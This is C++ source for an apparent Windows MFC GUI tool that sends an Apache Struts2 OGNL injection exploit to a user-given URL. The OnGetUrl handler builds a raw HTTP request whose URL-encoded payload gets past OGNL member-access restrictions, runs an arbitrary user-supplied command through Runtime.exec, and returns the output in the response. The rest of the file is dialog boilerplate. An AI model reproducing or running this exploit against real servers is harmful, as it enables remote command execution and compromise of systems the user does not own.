// GetTestDlg.cpp : implementation file
//

#include "stdafx.h"
#include "GetTest.h"
#include "GetTestDlg.h"
#include "HttpRequest.h"
#include "publicFunction.h"

#include "greta/regexpr2.h"

using namespace std;
using namespace regex;

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CGetTestDlg dialog

CGetTestDlg::CGetTestDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CGetTestDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CGetTestDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CGetTestDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CGetTestDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CGetTestDlg, CDialog)
	//{{AFX_MSG_MAP(CGetTestDlg)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON1, OnGetUrl)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CGetTestDlg message handlers

BOOL CGetTestDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	WSADATA wsaData;                     //每次socket发包的时候都是需要初始化的
	WSAStartup(MAKEWORD(2, 0), &wsaData);//

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	
	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CGetTestDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CGetTestDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}


bool GetRegexMatchStr(char *strMatchRule, CString &strMatch, CString &strResult)
{
	rpattern pat(strMatchRule);
	string strmatch = strMatch.GetBuffer(0);
	strMatch.ReleaseBuffer();
	CString csMatchRule = strMatchRule;
	match_results::backref_vector::iterator iter;
	match_results::backref_vector vec;
	match_results results;
	
	match_results::backref_type br = pat.match(strmatch.c_str(), results);
	
	if(br.matched)
	{
		vec = results.all_backrefs();
		iter = vec.begin();
		
		//当正则中出现(而不是\(,则说明需要捕获()中的子串
		if (csMatchRule.Find('(') >0 && csMatchRule.Find('(') != csMatchRule.Find("\\(") + 1)
		{
			iter ++;
		}
		string str = (*iter).str();
		strResult = str.c_str();
		return true;
	}
	return false;
}


void CGetTestDlg::OnGetUrl() 
{
	// TODO: Add your control notification handler code here
	CString url="";
	CString command="";
	GetDlgItemText(IDC_EDIT1,url);
	GetDlgItemText(IDC_EDIT3,command);
	CString chTarget="";//一定要记得初始化
	CString strResult ="it may not vulnerable";	
	char rule[]="http://.*?/";

    if(GetRegexMatchStr(rule,url,chTarget))
	{
		BOOL bSSL=FALSE;
		chTarget = chTarget.Mid(7,chTarget.GetLength()-8);
		CString csSend = "GET ";
		csSend += url;
		csSend +="?method:\%23_memberAccess\%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,\%23res\%3d\%40org.apache.struts2.ServletActionContext\%40getResponse\%28\%29,\%23res.setCharacterEncoding\%28\%23parameters.encoding[0]\%29,\%23w\%3d\%23res.getWriter\%28\%29,\%23s\%3dnew+java.util.Scanner\%28@java.lang.Runtime@getRuntime\%28\%29.exec\%28\%23parameters.cmd[0]\%29.getInputStream\%28\%29\%29.useDelimiter\%28\%23parameters.pp[0]\%29,\%23str\%3d\%23s.hasNext\%28\%29\%3f\%23s.next\%28\%29\%3a\%23parameters.ppp[0],\%23w.print\%28\%23str\%29,\%23w.close\%28\%29,1?\%23xx:\%23request.toString&cmd=";
		csSend += command;
		csSend +="&pp=\\\\A&ppp=\%20&encoding=UTF-8  HTTP/1.1\r\n";    
		csSend += "Host: ";
		csSend += chTarget;
		csSend += "\r\n";
		csSend += "User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:33.0) Gecko/20100101 Firefox/33.0\r\n";
		csSend += "Connection: close\r\n\r\n";
				
		int port = 80;
	//	CString TargetIP = gethostbyname(chTarget.GetBuffer(0));
		
		HOSTENT *host = gethostbyname(chTarget.GetBuffer(0));
		chTarget.ReleaseBuffer();
		CString strIP = "";
		if (host != NULL)
		{ 
			strIP = inet_ntoa(*(IN_ADDR*)host->h_addr_list[0]);
		}  
		
		CString strContent = GetWebDataEx(strIP, port, bSSL, false, csSend);
		if (!strContent.IsEmpty())
		{	
			if (-1 != strContent.Find("200 OK\r\n") )
			{
			
			    strResult=strContent;
			
			}
		}
		
		GetDlgItem(IDC_EDIT2)->SetWindowText(strResult);
		
	}
	
    else MessageBox("wrong url");
}
//	MessageBox(str);
//	GetDlgItem(IDC_EDIT2)->SetWindowText(str);



